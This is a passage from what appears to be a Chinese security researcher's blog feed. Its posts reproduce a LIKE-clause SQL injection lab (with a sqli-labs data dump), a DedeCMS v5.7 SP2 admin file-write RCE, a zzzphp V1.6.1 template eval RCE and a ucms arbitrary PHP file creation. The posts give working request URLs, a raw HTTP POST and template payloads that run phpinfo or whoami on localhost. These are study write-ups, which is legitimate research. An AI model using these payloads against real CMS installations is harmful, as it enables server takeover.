class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> Navicat Premium Data Transfer</span><br><span class="line"></span><br><span class="line"> Source Server         : 本地</span><br><span class="line"> Source Server Type    : MySQL</span><br><span class="line"> Source Server Version : 50540</span><br><span class="line"> Source Host           : localhost:3306</span><br><span class="line"> Source Schema         : security</span><br><span class="line"></span><br><span class="line"> Target Server Type    : MySQL</span><br><span class="line"> Target Server Version : 50540</span><br><span class="line"> File Encoding         : 65001</span><br><span class="line"></span><br><span class="line"> Date: 07/08/2019 18:47:37</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">SET NAMES utf8mb4;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for emails</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `emails`;</span><br><span class="line">CREATE TABLE `emails`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `email_id` varchar(30) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 9 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of emails</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `emails` VALUES (1, &apos;Dumb@dhakkan.com&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (2, &apos;Angel@iloveu.com&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (3, &apos;Dummy@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (4, &apos;secure@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (5, &apos;stupid@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (6, &apos;superman@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (7, &apos;batman@dhakkan.local&apos;);</span><br><span class="line">INSERT INTO `emails` VALUES (8, &apos;admin@dhakkan.com&apos;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for referers</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `referers`;</span><br><span class="line">CREATE TABLE `referers`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `referer` varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `ip_address` varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 4 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of referers</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `referers` VALUES (1, &apos;http://127.0.0.1/sqli-labs-master/Less-19/&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line">INSERT INTO `referers` VALUES (2, &apos;http://127.0.0.1/sqli-labs-master/Less-19/&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line">INSERT INTO `referers` VALUES (3, &apos;http://127.0.0.1/sqli-labs-master/Less-19/&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for uagents</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `uagents`;</span><br><span class="line">CREATE TABLE `uagents`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `uagent` varchar(256) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `ip_address` varchar(35) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `username` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 15 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of uagents</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `uagents` VALUES (1, &apos;/&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (2, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (3, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (4, &apos;/&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (5, &apos;and 1=1#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (6, &apos;and 1=12#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (7, &apos;order by 10#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (8, &apos;order by 10#&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (9, &apos;&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (10, &apos;&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (11, &apos;0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (12, &apos;0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (13, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `uagents` VALUES (14, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0&apos;, &apos;127.0.0.1&apos;, &apos;admin&apos;);</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Table structure for users</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `users`;</span><br><span class="line">CREATE TABLE `users`  (</span><br><span class="line">  `id` int(3) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  `password` varchar(20) CHARACTER SET gbk COLLATE gbk_chinese_ci NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = MyISAM AUTO_INCREMENT = 11 CHARACTER SET = gbk COLLATE = gbk_chinese_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">-- Records of users</span><br><span class="line">-- ----------------------------</span><br><span class="line">INSERT INTO `users` VALUES (1, &apos;Dumb&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (2, &apos;Angelina&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (3, &apos;Dummy&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (4, &apos;secure&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (5, &apos;stupid&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (6, &apos;superman&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (7, &apos;batman&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (8, &apos;admin&apos;, &apos;admin&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (9, &apos;test#&apos;, &apos;1&apos;);</span><br><span class="line">INSERT INTO `users` VALUES (10, &apos;test\&apos; #&apos;, &apos;1&apos;);</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure></p><p>将sql文件导入本地的mysql中就行了。</p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>like的用法我就不多说了，就是查找类似参数的数据。<br><img src="/2019/08/07/sql注入之like注入/like.png" alt></p><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/get.php?like=test</span><br></pre></td></tr></table></figure></p><p><img src="/2019/08/07/sql注入之like注入/like1.png" alt></p><p>注入的思路和一般可控参数的注入方式是一样的，首先我们要闭合一下。<br><img src="/2019/08/07/sql注入之like注入/like2.png" alt><br><img src="/2019/08/07/sql注入之like注入/like3.png" alt></p><p>也并不是两边都要有 %，我们只需要闭合单引号就行了，后面添加一个注释符。</p><p>接下来的流程都是一样的。</p><p>联合查询注入：<br><img src="/2019/08/07/sql注入之like注入/order1.png" alt><br>这里是因为我的数据库里面没有像 %test 这样的数据，所以返回为空。想要返回有数据的话把like参数的值变成<br><img src="/2019/08/07/sql注入之like注入/order2.png" alt><br><img src="/2019/08/07/sql注入之like注入/union.png" alt></p><p>布尔注入：<br><img src="/2019/08/07/sql注入之like注入/布尔1.png" alt><br><img src="/2019/08/07/sql注入之like注入/布尔2.png" alt></p><p>报错注入：<br><img src="/2019/08/07/sql注入之like注入/updatexml.png" alt></p><p>这里就写这三种方式的注入了。</p><p>在mssql下情况是一样的。<br><img src="/2019/08/07/sql注入之like注入/mssql.png" alt></p><p>为什么实战的时候就是没搞出来呢，奇奇怪怪的~</p><p>还有一些小众的注入点，像order by + $id / limit + $id / 这些可控的参数都可以造成注入，可以研究一下。</p><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI/blob/master/1-11-order%2Climit%E5%92%8Cfrom%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5.md" target="_blank" rel="noopener">order,limit和from后的注入</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在实战的过程中遇到了一个mssql的数据库，参数提交在了 &lt;strong&gt;like&lt;/strong&gt; 后的参数里面，本地测试注入能成功，但是在实战的时候不晓得后端进行了什么处理，没拿下，哎~~&lt;/p&gt;
&lt;p&gt;很烦，写篇博客纪念一下~&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>dedecms v5.7 sp2代码执行漏洞复现</title>
    <link href="http://yoursite.com/2019/08/06/dedecms-v5-7-sp2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/</id>
    <published>2019-08-06T02:57:43.000Z</published>
    <updated>2019-08-06T04:56:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>终于复现成功一个漏洞了~~  不过是后台的一个漏洞<br>– 源码地址：<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz</a><br><a id="more"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>要有后台管理员账号密码，登录后台。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/后台.png" alt></p><p>访问/dede/tpl.php?action=upload，审查源码，获取我们的token值。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/token.png" alt></p><p>然后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=abb438be63426baeee2db81a27dfd910</span><br></pre></td></tr></table></figure></p><p>后面加上我们上一步获取的token值。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/test.lib.php.png" alt></p><p>然后访问我们的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/include/taglib/test.lib.php</span><br></pre></td></tr></table></figure></p><p><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/phpinfo.png" alt></p><p>发现我们的代码写进去了。</p><p>访问include/taglib/test.lib.php<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/src.png" alt></p><h1 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>想一想我们的思路：<br>1、获取token值<br>2、访问指定的链接</p><p>就把我们的代码写入到/include/taglib/xxx.lib.php中</p><p>token值很容易获取，那么问题就是在那个链接上面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dedev5.7/dede/tpl.php?filename=test.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=abb438be63426baeee2db81a27dfd910</span><br></pre></td></tr></table></figure></p><p>看一下参数，就知道这是一个文件保存的操作。</p><p>问题出现在tpl.php</p><p>这个文件代码也没有多少。</p><p><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/savefile.png" alt></p><p>很快就能定位到问题代码。不过我这里可能是编码的原因有点乱码，但是这问题不大，我们把逻辑结构看懂就行了。</p><p>首先会匹配正则， 要以.lib.php结尾。</p><p>然后会将 $content 写入到 $filename 中。</p><p>那么我们要跟踪一下文件对这两个参数进行的处理。</p><p>然后我们回过头来看整个文件的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &apos;&apos;, $filename);//line21</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);//line260</span><br><span class="line">$content = stripslashes($content);//line261</span><br></pre></td></tr></table></figure></p><p>可以看出，只有替换，并没有对参数进行安全防护措施。</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>又是一个安全防护不到位的一个漏洞，为什么就没挖到呢。</p><p>于是用seay源代码审计扫了一下。没有扫出这个漏洞点。<br><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/seay.png" alt></p><p>发现这个点是后台的一个功能点。</p><p><img src="/2019/08/06/dedecms-v5-7-sp2代码执行漏洞复现/tag.png" alt></p><p>代码审计还是需要多方面考虑，以前一直在看代码，没有从功能点上去考虑，可以转换一下代码审计的思路，尝试去通过功能点，去思考可能会存在什么漏洞，然后去看源码。</p><p>对于后台，通常不管是渗透测试、还是代码审计，目标都是拿shell，那么我们就要多多考虑对文件进行的操作了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;终于复现成功一个漏洞了~~  不过是后台的一个漏洞&lt;br&gt;– 源码地址：&lt;a href=&quot;http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>zzzphp V1.6.1 远程代码执行漏洞分析</title>
    <link href="http://yoursite.com/2019/08/04/zzzphp-V1-6-1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/</id>
    <published>2019-08-04T09:24:42.000Z</published>
    <updated>2019-08-05T02:41:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个通过模板来进行命令执行的一个例子，第一次遇到，很有趣。</p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>本地搭建好环境，登录后台，找到模板管理–&gt;模板管理：<br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/模板.png" alt></p><p>然后找到cn2016/html/search.html(其实也就是网站下/zzzphp/template/pc/cn2016/html/search.html)，将里面的代码修改或者添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们再访问 <a href="http://127.0.0.1/zzzphp/search/" target="_blank" rel="noopener">http://127.0.0.1/zzzphp/search/</a><br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/phpinfo.png" alt></p><p>看见phpinfo已经执行出来了，怎么出来的，能够怎么利用，目前还不知道，跟踪下源码吧。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/search.png" alt></p><p>原来的search.html长这个样子。</p><p>首先我是跟踪到了search/index.php：<br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/search.index.php.png" alt></p><p>然后引用了 /inc/zzz_client.php ，跟踪下去<br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/zzz_client.png" alt></p><p>这里又引用了 zzz_template.php， 还不确定，先看一下。</p><p>这个文件里面有很多正则表达式，匹配了我们search.html中的{zzz:xxxx}</p><p>然后就一直往下看，在文件快结束的地方，找到了想要的代码。<br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/eval.png" alt></p><p>有了eval函数，看来基本上就是这里了，接下来我们慢慢分析。</p><p>这里为了方便，写了一段测试代码，来看一下匹配之后的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$zcontent = &apos;&#123;if:assert($_request[phpinfo()])&#125;phpinfo();&#123;end if&#125;&apos;;</span><br><span class="line">$pattern = &apos;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&apos;;</span><br><span class="line">preg_match_all( $pattern, $zcontent, $matches);</span><br><span class="line">var_dump($matches)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/var_dump.png" alt></p><p>我们就晓得 $matches 变量的值了。</p><p>继续看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if ( preg_match_all( $pattern, $zcontent, $matches ) ) &#123;</span><br><span class="line">$count = count( $matches[ 0 ] );</span><br><span class="line">for ( $i = 0; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">$flag = &apos;&apos;;</span><br><span class="line">$out_html = &apos;&apos;;</span><br><span class="line">$ifstr = $matches[ 1 ][ $i ];</span><br><span class="line">$ifstr = str_replace( &apos;&lt;&gt;&apos;, &apos;!=&apos;, $ifstr );</span><br><span class="line">$ifstr = str_replace( &apos;mod&apos;, &apos;%&apos;, $ifstr );</span><br><span class="line">$ifstr1 = cleft( $ifstr, 0, 1 );</span><br><span class="line">switch ( $ifstr1 ) &#123;</span><br><span class="line">case &apos;=&apos;:</span><br><span class="line">$ifstr = &apos;0&apos; . $ifstr;</span><br><span class="line">break;</span><br><span class="line">case &apos;&#123;&apos;:</span><br><span class="line">case &apos;[&apos;:</span><br><span class="line">$ifstr = &quot;&apos;&quot; . str_replace( &quot;=&quot;, &quot;&apos;=&quot;, $ifstr );</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">$ifstr = str_replace( &apos;=&apos;, &apos;==&apos;, $ifstr );</span><br><span class="line">$ifstr = str_replace( &apos;===&apos;, &apos;==&apos;, $ifstr );</span><br><span class="line">@eval( &apos;if(&apos; . $ifstr . &apos;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&apos; );</span><br></pre></td></tr></table></figure></p><p>$ifstr 变量的值为 $matches[ 1 ][ $i ]，我们这里也就是$matches[ 1 ][ 0 ]，也就是 <strong>assert($_request[phpinfo()])</strong></p><p>然后继续跟进，有一个cleft函数进行了处理，跟进：<br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/cleft.png" alt></p><p>这段代码的意思就是去除掉两边的空格之后，取出我们的第一个字符。</p><p>我们这里的 $ifstr 第一个字符 “{“ ，没啥用，最后就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval( &apos;if(&apos; . $ifstr . &apos;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&apos; );</span><br></pre></td></tr></table></figure></p><p>我们这里吧 $ifstr 的值带进去。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval( &apos;if(assert($_request[phpinfo()]))&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&apos; );</span><br></pre></td></tr></table></figure></p><p>然后本地运行一下：<br><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/result.png" alt></p><p>居然执行了~~~</p><p><img src="/2019/08/04/zzzphp-V1-6-1-远程代码执行漏洞分析/whoami.png" alt></p><p>神奇。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval( &apos;if(system(&quot;whoami&quot;))&#123;&#125;else&#123;&#125;&apos; );</span><br></pre></td></tr></table></figure></p><p>看来里面是条件语句判断也行。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个通过模板来进行命令执行的一个例子，第一次遇到，很有趣。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ucms系统存在代码注入漏洞的分析</title>
    <link href="http://yoursite.com/2019/08/01/ucms%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/08/01/ucms系统存在代码注入漏洞的分析/</id>
    <published>2019-08-01T10:06:16.000Z</published>
    <updated>2019-08-01T11:32:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文在这里：<a href="http://blog.topsec.com.cn/%e5%a4%a9%e8%9e%8d%e4%bf%a1%e5%85%b3%e4%ba%8eucms%e7%b3%bb%e7%bb%9f%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90/" title="http://blog.topsec.com.cn/%e5%a4%a9%e8%9e%8d%e4%bf%a1%e5%85%b3%e4%ba%8eucms%e7%b3%bb%e7%bb%9f%e5%ad%98%e5%9c%a8%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e5%88%86%e6%9e%90/" target="_blank" rel="noopener">天融信关于ucms系统存在代码注入漏洞的分析</a></p><p>其实这个漏洞就是后台文件管理的地方可以随意新建文件，而且没有任何的后缀名拦截、白名单验证、权限限制。</p><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>后台–&gt;文件管理–&gt;随便找一个文件夹或者文件–&gt;编辑–&gt;保存<br>没啥好说的就不截图了，发送的包如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /ucms/ucms/index.php?do=sadmin_fileedit&amp;dir=/ucms/ucms/&amp;file=123.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 71</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/ucms/ucms/index.php?do=sadmin_fileedit&amp;dir=/ucms/ucms/&amp;file=123.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: admin_76efa6=admin; psw_76efa6=cf511c59650e77111ee74a048b60dffa; token_76efa6=614eae0e; UM_distinctid=16ac619051121e-0d22e60a265d32-10724c6f-1fa400-16ac619051393; CNZZDATA3801251=cnzz_eid%3D1624451277-1558101881-%26ntime%3D1558101881; name=123123; mail=1223123; url=http%3A%2F%2F12312; 23wi_2132_saltkey=hwfQF0VM; 23wi_2132_lastvisit=1563781678; AkJ7_2132_saltkey=RfJ96qio; AkJ7_2132_lastvisit=1563886642; Jxt1_2132_saltkey=CtIr0c5F; Jxt1_2132_lastvisit=1563886956; PHPSESSID=famkplqd5bhn61pe26j17is9l4; cscms_session=63adtrleis9tjm1dfv96n2g0lh4nqeic</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">uuu_token=614eae0e&amp;co=&lt;?php phpinfo();?&gt;&amp;pos=0</span><br></pre></td></tr></table></figure><p><strong>dir</strong>是目录，<strong>file</strong>是文件名，<strong>co</strong>是文件的内容。</p><p>然后访问 <a href="http://127.0.0.1/ucms/ucms/123.php" target="_blank" rel="noopener">http://127.0.0.1/ucms/ucms/123.php</a><br><img src="/2019/08/01/ucms系统存在代码注入漏洞的分析/phpinfo.png" alt></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>其实这里也没啥好写的，写一下漏洞跟踪的流程吧~小伙伴们最好自己跟踪下代码哦~</p><p>首先这个漏洞是后台的一个漏洞，我们这里要看下后台的index.php文件，ucms/ucms/index.php</p><p>然后看下代码，首先是要看代码对 <strong>do</strong> 这个参数是如何进行处理的：<br>line41-54<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 